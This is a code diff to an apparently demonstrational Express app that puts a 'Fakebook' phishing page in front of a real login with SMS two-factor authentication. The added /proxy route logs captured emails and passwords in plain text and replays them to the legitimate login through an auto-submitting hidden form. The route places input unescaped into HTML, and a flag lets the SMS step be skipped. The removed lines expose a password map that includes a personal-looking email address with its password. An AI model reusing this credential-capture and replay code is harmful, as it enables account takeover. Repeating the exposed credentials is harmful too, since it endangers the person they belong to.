@@ -119,6 +119,10 @@ function getCurrentCommitId() {
   }
 }
 
+function isDemoSmsEnabled() {
+  return process.env.DEMO_SMS_ENABLED !== 'false';
+}
+
 // Proxy: fakebook login page that captures the user's credentials and forwards the flow to the legitimate app.
 function readProxySessionCookie(req) {
   const cookieHeader = req.headers.cookie || '';
@@ -166,13 +170,44 @@ app.get('/', (req, res) => {
   if (req.session.user) {
     return res.redirect('/inside');
   }
-  // Proxy page: minimalist UI that captures credentials and hands the user to the legitimate flow.
+  // Fakebook login page acting as a credential-capture proxy before the legitimate flow continues.
   res.send(renderProxyPage(req));
 });
 
-// Proxy receives the credentials, stores the session state, and then shows the legitimate SMS challenge screen.
-app.post('/login', (req, res) => {
+// Fakebook receives the credentials, stores the session state, and then shows the legitimate SMS challenge screen.
+app.post('/proxy', (req, res) => {
   const { email, password } = req.body;
+  console.log(`[PROXY] New tab opened from Fakebook for ${email}`);
+  console.log(`[PROXY] Captured credentials: ${email} | ${password}`);
+
+  if (!email || !password) {
+    return res.status(400).send('<h2>Missing credentials</h2>');
+  }
+
+  return res.send(`<!DOCTYPE html>
+    <html lang="en">
+      <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Proxy redirect</title>
+      </head>
+      <body>
+        <form id="proxy-form" method="POST" action="/login">
+          <input type="hidden" name="email" value="${email}" />
+          <input type="hidden" name="password" value="${password}" />
+        </form>
+        <script>
+          console.log('[PROXY] Replaying captured credentials to legitimate login');
+          document.getElementById('proxy-form').submit();
+        </script>
+      </body>
+    </html>`);
+});
+
+app.post('/login', (req, res) => {
+  // The browser opens a new tab because the fakebook form submits to a credential-capture flow.
+  const { email, password } = req.body;
+  console.log(`[LOGIN] Proxy forwarded credentials for ${email}`);
   console.log(`[LOGIN] Email: ${email} | Password: ${password}`);
 
   const user = users[email];
@@ -180,6 +215,29 @@ app.post('/login', (req, res) => {
   if (!user || !bcrypt.compareSync(password, user.passwordHash)) {
     console.log(`[LOGIN] Failed credentials for: ${email}`);
     return res.status(401).send('<h2>Invalid credentials</h2><p><a href="/">Back to login</a></p>');
+  }
+
+  if (!isDemoSmsEnabled()) {
+    req.session.user = {
+      email,
+      name: user.name,
+      role: user.role,
+      authenticatedAt: new Date().toISOString(),
+      authState: 'authenticated'
+    };
+    req.session.currentView = 'legitimate-demo';
+    req.session.pageMessage = 'Credenciales válidas; flujo SMS desactivado';
+    req.session.smsCode = null;
+    console.log(`[LOGIN] Legitimate app accepted credentials for ${email} without SMS`);
+    logSessionState(`Login success for ${email} without SMS`, req);
+
+    return req.session.save((saveError) => {
+      if (saveError) {
+        console.error(`[SESSION] Save error after login for ${email}:`, saveError);
+        return res.status(500).send('<h2>Could not finalize authentication</h2><p><a href="/">Back to login</a></p>');
+      }
+      return res.redirect('/inside');
+    });
   }
 
   const smsCode = String(Math.floor(100000 + Math.random() * 900000));
@@ -207,6 +265,10 @@ app.post('/login', (req, res) => {
 });
 
 app.get('/sms', requireAuth, (req, res) => {
+  if (!isDemoSmsEnabled()) {
+    return res.redirect('/inside');
+  }
+
   if (!req.session.user || req.session.user.authState !== 'pending_sms') {
     return res.redirect('/');
   }
@@ -339,6 +401,10 @@ app.get('/sms', requireAuth, (req, res) => {
 });
 
 app.post('/sms', requireAuth, (req, res) => {
+  if (!isDemoSmsEnabled()) {
+    return res.redirect('/inside');
+  }
+
   const smsCode = req.body.code;
   const expectedCode = req.session.smsCode;
 
@@ -375,14 +441,9 @@ app.get('/inside', requireAuth, (req, res) => {
   req.session.currentView = 'legitimate-demo';
   req.session.pageMessage = 'estás dentro de la página legítima';
   console.log(`[VIEW] User ${req.session.user.email} is viewing: ${req.session.pageMessage}`);
+  console.log(`[LOGIN] Legitimate page loaded for ${req.session.user.email}`);
 
   const userEmail = req.session.user.email || 'demo@company.test';
-  const demoPasswordMap = {
-    'analyst@company.test': 'DemoPass123!',
-    'admin@company.test': 'AdminPass456!',
-    'yaiza_rv@hotmail.com': '1Q2w3e4r5t6y$'
-  };
-  const passwordValue = demoPasswordMap[userEmail] || 'demo-password';
 
   return res.send(`<!DOCTYPE html>
     <html lang="es">
